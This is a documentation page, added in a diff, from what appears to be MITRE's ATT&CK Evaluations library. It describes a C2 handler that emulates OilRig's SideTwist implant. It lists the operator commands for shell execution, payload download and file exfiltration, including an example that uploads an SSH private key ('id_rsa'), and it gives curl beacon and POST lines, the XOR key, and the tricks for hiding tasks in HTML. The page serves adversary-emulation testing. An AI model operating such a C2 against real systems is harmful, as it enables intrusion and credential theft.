@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>SideTwist handler</title>
+    <meta name="title" content="SideTwist handler">
+    <meta name="description" content="The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending...">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/oilrig/resources/control_server/handlers/sidetwist/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/oilrig/resources/control_server/handlers/sidetwist/">
+    <meta property="og:title" content="SideTwist handler">
+    <meta property="og:description" content="The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending...">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/oilrig/resources/control_server/handlers/sidetwist/">
+    <meta property="twitter:title" content="SideTwist handler">
+    <meta property="twitter:description" content="The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending...">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Managed Services
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/oilrig/" class="pr-4">
+                                                Oil​Rig
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Resources
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/oilrig/resources/control_server/" class="pr-4">
+                                                ATT&​CK Evaluations Control Server
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Handlers
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/oilrig/resources/control_server/handlers/sidetwist/" class="pr-4">
+                                                Side​Twist handler
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="sidetwist-handler" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sidetwist-handler">#</doc-anchor-trigger>
+        <span>SideTwist handler</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../categories/managed-services/">managed-services</a></div>
+</div>
+
+<p>The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending commands embedded in HTML and receiving the associated output.</p>
+<doc-anchor-target id="components">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#components">#</doc-anchor-trigger>
+        <span>Components</span>
+    </h2>
+</doc-anchor-target>
+<p>The handler consists of a web server that listens on a specified address/port and serves the following URL endpoints:</p>
+<ul>
+<li><code v-pre>GET /search/{guid}</code>, where <code v-pre>{guid}</code> represents the unique ID of an implant session to register and receive tasks. E.g. the first <code v-pre>GET</code> request for <code v-pre>/search/1234</code> will create a new implant session with ID <code v-pre>1234</code>, and subsequent <code v-pre>GET</code> requests will simply return tasks.</li>
+<li><code v-pre>POST /search/{guid}</code> is used to submit results (task output or file uploads) for the implant with the specified ID.</li>
+<li><code v-pre>GET /getFile/{filename}</code> is used to fetch payloads of the name <code v-pre>{filename}</code>. Available payloads are listed in the <code v-pre>files</code> directory within the main C2 server repo.</li>
+<li><code v-pre>GET /logo.png</code> serves the lookalike website logo. This will typically be requested only when using a browser to view the lookalike site.</li>
+</ul>
+<doc-anchor-target id="usage">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#usage">#</doc-anchor-trigger>
+        <span>Usage</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="configuration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#configuration">#</doc-anchor-trigger>
+        <span>Configuration</span>
+    </h3>
+</doc-anchor-target>
+<p>To enable and configure the SideTwist handler within the control server, edit the <code v-pre>config/handler_config.yml</code> from the main C2 server repo. Adjust the SideTwist entry as needed.</p>
+<p>Example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">sidetwist:
+  host: 192.168.0.8
+  port: 443
+  enabled: true</code></pre>
+</doc-codeblock></div>
+<p>Run the <code v-pre>controlServer</code> binary as <code v-pre>sudo</code> and look for success messages in starting up the SideTwist handler.</p>
+<doc-anchor-target id="tasking-implants">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#tasking-implants">#</doc-anchor-trigger>
+        <span>Tasking Implants</span>
+    </h3>
+</doc-anchor-target>
+<p>To register or receive tasking for an implant session, the SideTwist handler expects a <code v-pre>GET</code> request for <code v-pre>/search/{guid}</code>. If this is the first time that the SideTwist handler recognizes the implant with id <code v-pre>{guid}</code>, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent <code v-pre>GET</code> requests to the same endpoint.</p>
+<p>For example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">curl http://192.168.0.4:443/search/abcd # First request, registers a new implant session with ID &quot;abcd&quot;. Returns empty task.
+curl http://192.168.0.4:443/search/abcd # Second request. Session for &quot;abcd&quot; already exists, returns a task if available, otherwise empty task.</code></pre>
+</doc-codeblock></div>
+<p>As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the <code v-pre>evalsC2client.py</code> script.
+The SideTwist handler will allow operators to task the following command types:</p>
+<ul>
+<li><code v-pre>101 command arg1 arg2...</code> - the command ID <code v-pre>101</code> will have the implant execute a shell command with the provided args. Note that a command is required for ID <code v-pre>101</code>.</li>
+<li><code v-pre>102 saveAsName|payloadName</code> - the command ID <code v-pre>102</code> will have the implant request a payload specified by <code v-pre>payloadName</code> and save it as <code v-pre>saveAsName</code>.
+<ul>
+<li>WARNING: the handler does not validate the command structure or payload names/paths, so operators must ensure that the correct names and paths are used, the <code v-pre>|</code> character is correctly placed, etc.</li>
+</ul>
+</li>
+<li><code v-pre>103 fileToUpload</code> - the command ID <code v-pre>103</code> will have the implant upload the specified local file to the C2 server.</li>
+<li><code v-pre>104 command arg1 arg2...</code> - the command ID <code v-pre>104</code> is an alias for command ID <code v-pre>101</code>. Note that a command is required for ID <code v-pre>104</code>.</li>
+<li><code v-pre>105</code> - instructs the implant to terminate. Used when the implant is in loop mode.</li>
+</ul>
+<p>Examples of valid tasking:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task &lt;guid&gt; '101 whoami.exe'
+./evalsC2client.py --set-task &lt;guid&gt; '101 ping 1.2.3.4'
+./evalsC2client.py --set-task &lt;guid&gt; '102 c:\users\public\payload.exe|payload.exe'
+./evalsC2client.py --set-task &lt;guid&gt; '102 localpath\file.name|serverfile.name'
+./evalsC2client.py --set-task &lt;guid&gt; '103 c:\users\dummy\.ssh\id_rsa'
+./evalsC2client.py --set-task &lt;guid&gt; '104 dir &quot;C:\path with\spaces&quot;'
+./evalsC2client.py --set-task &lt;guid&gt; '105'</code></pre>
+</doc-codeblock></div>
+<p>Examples of invalid tasking:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task &lt;guid&gt; '101' # 101 requires a command
+./evalsC2client.py --set-task &lt;guid&gt; '102' # 102 requires a payload name
+./evalsC2client.py --set-task &lt;guid&gt; '103' # 103 requires a filename
+./evalsC2client.py --set-task &lt;guid&gt; '104' # 104 requires a command
+./evalsC2client.py --set-task &lt;guid&gt; '106' # 106 is not a supported command ID</code></pre>
+</doc-codeblock></div>
+<p>When the implant beacons in with the <code v-pre>GET /search/{guid}</code> requests, the returned HTTP response contains an HTML page with an embedded task string that has been encrypted and base64-encoded.
+The embedded string is placed within <code v-pre>&lt;script&gt;</code> HTML tags, e.g.:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;script&gt;/*Q14IEQ==*/&lt;/script&gt;</code></pre>
+</doc-codeblock></div>
+<p>Encryption and decryption are performed by XOR&#x27;ing the plaintext/ciphertext with the hardcoded key <code v-pre>notmersenne</code>.
+The underlying plaintext data is the task string that gets processed by the implant and is of the form <code v-pre>commandNumber|commandID|base64(command to execute)</code>.
+For instance, the first task assigned to the implant may look something like <code v-pre>1|101|d2hvYW1pLmV4ZSAvYWxs</code> (base64 encoding of <code v-pre>whoami.exe /all</code>), and the second task may look something like <code v-pre>2|102|YzpcdXNlcnNccHVibGljXHBheWxvYWQuZXhlfHBheWxvYWQuZXhl</code> (base64 encoding of <code v-pre>c:\users\public\payload.exe|payload.exe</code>). Note that if an implant beacons in, but there is no pending task for the session, the empty task string <code v-pre>-1||</code> is returned.</p>
+<doc-anchor-target id="payloads">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#payloads">#</doc-anchor-trigger>
+        <span>Payloads</span>
+    </h3>
+</doc-anchor-target>
+<p>Like tasking, requested payloads are XOR-encrypted and base64-encoded before being returned. However, the payload data is not embedded in an HTML page. Instead, the raw encrypted/encoded file data is returned.</p>
+<p>SideTwist-specific payloads must be stored within the <code v-pre>payloads/SideTwist</code> directory within the parent directory of the control server. For instance, if the control server is being run from the <code v-pre>Resources/control_server</code> directory, the payloads must be placed in <code v-pre>Resources/payloads/SideTwist/</code> in order for the SideTwist handler to successfully serve them.</p>
+<doc-anchor-target id="file-uploads-and-task-output">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#file-uploads-and-task-output">#</doc-anchor-trigger>
+        <span>File Uploads and Task Output</span>
+    </h3>
+</doc-anchor-target>
+<p>When implants send task output or file uploads to the SideTwist C2 handler, they must do so by sending an HTTP <code v-pre>POST</code> request to <code v-pre>/search/{guid}</code> with their corresponding <code v-pre>guid</code> value. The server will not accept task output or file uploads from an implant if no task was assigned to the implant or if the specified task does not expect output (e.g. tasking the implant to terminate itself). The <code v-pre>POST</code> data must be a JSON dictionary with one key-value pair - the key is a string representation of the corresponding command number, and the value is a string containing the base64 encoding of the XOR-encrypted output or uploaded file data.</p>
+<p>Example (implant <code v-pre>abcd</code> submits output <code v-pre>thisismyoutput</code> for command number 5):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">curl -X POST --data '{&quot;5&quot;: &quot;GgcdHgwBHhwBGxEeGgA=&quot;}' http://192.168.0.4:443/search/abcd</code></pre>
+</doc-codeblock></div>
+<p>Upon success, a successful HTTP response code is sent back with an empty response body.</p>
+<p>For regular task output, the SideTwist handler will forward the decoded and decrypted output to the REST server. File uploads will be decoded and decrypted before being written to the server&#x27;s file system.</p>
+<p>Note that the file uploads themselves do not contain the file name to save as - this is determined by the handler when tasking the implant with command ID <code v-pre>104</code>. For instance, if the implant is tasked with <code v-pre>104 C:\path\to\file.txt</code>, then the received file upload data will be saved as <code v-pre>file.txt</code> within the C2 server&#x27;s <code v-pre>files</code> directory.</p>
+<doc-anchor-target id="bootstrap-tasking">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bootstrap-tasking">#</doc-anchor-trigger>
+        <span>Bootstrap Tasking</span>
+    </h3>
+</doc-anchor-target>
+<p>Since the SideTwist implant beacons back infrequently, the first beacon can be &quot;wasted&quot; since all it does is register a session without returning a command. If operators choose to do so, they can register &quot;bootstrap&quot; tasks, which will be the first task sent to any new session registered with the sidetwist handler. Note that only one bootstrap task can be registered for the SideTwist handler, and the task will only be sent on the implant&#x27;s first beacon when registering a session. Subsequent beacons from the same implant will not return this task.</p>
+<p>To set a bootstrap task, use the <code v-pre>evalsC2client.py</code> script accordingly:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-bootstrap-task sidetwist '101 whoami.exe /all'</code></pre>
+</doc-codeblock></div>
+<p>In the example above, all new sidetwist sessions will be tasked with <code v-pre>101 whoami.exe/all</code>. Note that the task syntax must be the same as in regular tasking via <code v-pre>--set-task</code>.
+Subsequent calls to <code v-pre>--set-bootstrap-task</code> will overwrite the currently set task.</p>
+<p>To view or clear the currently set bootstrap task, run the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --get-bootstrap-task sidetwist # view the currently set bootstrap task for sidetwist
+./evalsC2client.py --del-bootstrap-task sidetwist # clear the bootstrap task for sidetwist</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="error-messages">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#error-messages">#</doc-anchor-trigger>
+        <span>Error Messages</span>
+    </h3>
+</doc-anchor-target>
+<p>In order to maintain some level of secrecy and OpSec, the handler will not return specific error messages in response to HTTP requests. Any specific error messages will be logged to the console and log file on the C2 server itself. The implant and HTTP requests will simply receive a generic error message of <code v-pre>Internal server error</code> with HTTP error code <code v-pre>500</code>.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../managedservices/oilrig/resources/control_server/handlers/trickbot/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">ATT&​CK Evaluations Trick​Bot Handler</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../managedservices/oilrig/resources/setup/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Oil​Rig Setup Procedure</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "SideTwist handler", level: 6, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
